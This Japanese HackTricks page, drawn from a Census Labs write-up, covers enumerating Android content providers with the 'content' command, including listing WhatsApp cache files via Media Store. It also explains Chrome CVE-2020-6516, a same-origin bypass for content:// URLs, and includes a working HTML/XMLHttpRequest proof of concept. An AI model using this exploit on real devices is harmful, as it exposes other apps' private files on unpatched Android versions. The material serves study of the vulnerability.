<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)でゼロからヒーローまでのAWSハッキングを学ぶ</strong></a><strong>！</strong></summary>

HackTricksをサポートする他の方法:

* **HackTricksにあなたの会社を広告したい場合**、または**HackTricksをPDFでダウンロードしたい場合**は、[**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**公式PEASS & HackTricksグッズ**](https://peass.creator-spring.com)を入手する
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)のコレクションをチェックする
* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)や[**telegramグループ**](https://t.me/peass)に**参加する**か、**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)を**フォローする**。
* [**HackTricks**](https://github.com/carlospolop/hacktricks)と[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のgithubリポジトリにPRを提出して、あなたのハッキングのコツを**共有する**。

</details>


コンテンツプロバイダーを実験するには、Androidデバイスで`content`コマンドを使用できます。必ずしもルートアクセスが必要というわけではありません。例えば、Media Storeが管理するファイルのリストを見るには、次のコマンドを実行します：
```bash
$ content query --uri content://media/external/file
```
出力をより人間に優しくするために、インデックスされた各ファイルの識別子とパスに表示される列を制限することができます。
```bash
$ content query --uri content://media/external/file --projection _id,_data
```
コンテンツプロバイダは独自のプライベート名前空間に存在します。上記の例で示されているように、コンテンツプロバイダにアクセスするには、対応する `content://` URIを指定する必要があります。一般的に、プロバイダにアクセスするためのパスに関する情報は、アプリケーションマニフェスト（コンテンツプロバイダがアプリケーションによってエクスポートされている場合）やAndroidフレームワークのソースコードを見ることで回復することができます。

興味深いことに、AndroidデバイスのChromeは、`content://` スキームを介してコンテンツプロバイダにアクセスすることをサポートしています。この機能により、ブラウザはサードパーティアプリケーションによってエクスポートされたリソース（例：写真、ドキュメントなど）にアクセスできます。これを確認するには、メディアストアにカスタムエントリを挿入し、その後ブラウザを使用してアクセスします。
```bash
$ cd /sdcard
$ echo "Hello, world!" > test.txt
$ content insert --uri content://media/external/file \
--bind _data:s:/storage/emulated/0/test.txt \
--bind mime_type:s:text/plain
```
新しく挿入されたファイルの識別子を発見するために：
```bash
$ content query --uri content://media/external/file \
--projection _id,_data | grep test.txt
Row: 283 _id=747, _data=/storage/emulated/0/test.txt
```
```markdown
実際にChromeでファイルを表示するには、次の画像に示されているようなURLを使用できます。上で発見されたファイル識別子747がURLの接尾辞として使用されていることに注意してください。

![Chrome "Hello, world!"](https://census-labs.com/media/whatsapp-screenshot-hello-world.png)

例えば、以下のようにWhatsAppに関連するすべてのファイルをリストできます：
```
```bash
$ content query --uri content://media/external/file --projection _id,_data | grep -i whatsapp
...

Row: 82 _id=58, _data=/storage/emulated/0/Android/data/com.whatsapp/cache/SSLSessionCache
Row: 83 _id=705, _data=/storage/emulated/0/Android/data/com.whatsapp/cache/SSLSessionCache/157.240.9.53.443
Row: 84 _id=239, _data=/storage/emulated/0/Android/data/com.whatsapp/cache/SSLSessionCache/crashlogs.whatsapp.net.443
Row: 85 _id=240, _data=/storage/emulated/0/Android/data/com.whatsapp/cache/SSLSessionCache/pps.whatsapp.net.443
Row: 86 _id=90, _data=/storage/emulated/0/Android/data/com.whatsapp/cache/SSLSessionCache/static.whatsapp.net.443
Row: 87 _id=706, _data=/storage/emulated/0/Android/data/com.whatsapp/cache/SSLSessionCache/v.whatsapp.net.443
Row: 88 _id=89, _data=/storage/emulated/0/Android/data/com.whatsapp/cache/SSLSessionCache/www.whatsapp.com.443
...
```
## Chrome CVE-2020-6516 同一生成元ポリシー(SOP)のバイパス <a href="#cve-2020-6516" id="cve-2020-6516"></a>

ブラウザの _同一生成元ポリシー_ (SOP) \[[12](https://developer.mozilla.org/en-US/docs/Web/Security/Same-origin\_policy)] は、URL AのJavascriptコンテンツがURL Bのコンテンツにアクセスできるのは、以下のURL属性がAとBで同じである場合に限られると定めています:

* プロトコル 例: `https` 対 `http`
* ドメイン 例: `www.example1.com` 対 `www.example2.com`
* ポート 例: `www.example1.com:8080` 対 `www.example1.com:8443`

上記のルールには例外もありますが、一般的には `https://www.example1.com` のリソース（例えばJavascriptコード）は `https://www.example2.com` のリソースのDOMにアクセスできません。これは重大な情報漏洩を引き起こす可能性があるからです。**Cross-Origin-Resource-Sharing (CORS) ポリシーが明示的に許可していない限り、ウェブリソースがSOPルールをバイパスすることはできません。**

Chromeは `content://` を _ローカルスキーム_ とみなすことに注意が必要です。これは `file://` と同様です。この場合、SOPルールはさらに厳しく、各ローカルスキームURLは別の生成元とみなされます。例えば、**file:///tmp/test.html** のJavascriptコードは **file:///tmp/test2.html** の内容や、ファイルシステム上の他のファイルにアクセスできるべきではありません。**その結果、SOPルールによれば、`content://` 経由でロードされたリソースは他の `content://` リソースにアクセスできるはずがありません。** しかし、Chromeの脆弱性CVE-2020-6516はこのルールの「例外」を作りました。

CVE-2020-6516 \[[03](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-6516)] は、`content://` URL経由でロードされたリソースに対するSOPのバイパスです。**例えば、`content://com.example.provider/test.html` からロードされたHTMLドキュメントのコンテキスト内で実行されるJavascriptコードは、`content://` URL経由でロードされた他のリソースをロードしてアクセスすることができます。** これは特にAndroid 9以前のバージョンのAndroidを実行しているデバイスにおいて重大な脆弱性です。これらのデバイスではスコープ付きストレージ \[[13](https://developer.android.com/about/versions/10/privacy/changes#scoped-storage)] が実装されておらず、結果として **/sdcard** 下のアプリケーション固有のデータ、特に **/sdcard/Android** 下のデータがシステムのMedia Storeコンテンツプロバイダーを介してアクセス可能です。

実証例は非常に簡単です。任意の `content://` URLにアクセスするために `XMLHttpRequest` を使用するHTMLドキュメントを **/sdcard** 下にアップロードします。それからMedia Storeに追加され、先に示した例と同様の方法でChromeでレンダリングされます。デモンストレーションの目的で、実際には "Hello, world!" の例のMedia Store URLである `content://media/external/file/747` をロードしようとすることができます。驚くべきことに、HTMLドキュメントの生成元内で実行されるJavascriptコードは **test.txt** の内容を取得して表示します。
```markup
<html>
<head>
<title>PoC</title>
<script type="text/javascript">
function poc()
{
var xhr = new XMLHttpRequest();

xhr.onreadystatechange = function()
{
if(this.readyState == 4)
{
if(this.status == 200 || this.status == 0)
{
alert(xhr.response);
}
}
}

xhr.open("GET", "content://media/external/file/747");
xhr.send();
}
</script>
</head>
<body onload="poc()"></body>
</html>
```
**このライトアップからの情報:** [**https://census-labs.com/news/2021/04/14/whatsapp-mitd-remote-exploitation-CVE-2021-24027/**](https://census-labs.com/news/2021/04/14/whatsapp-mitd-remote-exploitation-CVE-2021-24027/)


<details>

<summary><strong>AWSハッキングをゼロからヒーローまで学ぶ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>！</strong></summary>

HackTricksをサポートする他の方法:

* **HackTricksにあなたの会社を広告したい**、または**HackTricksをPDFでダウンロードしたい**場合は、[**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**公式PEASS & HackTricksグッズ**](https://peass.creator-spring.com)を入手する
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、私たちの独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)コレクションをチェックする
* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)に**参加する**か、[**テレグラムグループ**](https://t.me/peass)に参加するか、**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)で**フォローする**。
* [**HackTricks**](https://github.com/carlospolop/hacktricks)と[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のgithubリポジトリにPRを提出して、あなたのハッキングのコツを**共有する**。

</details>
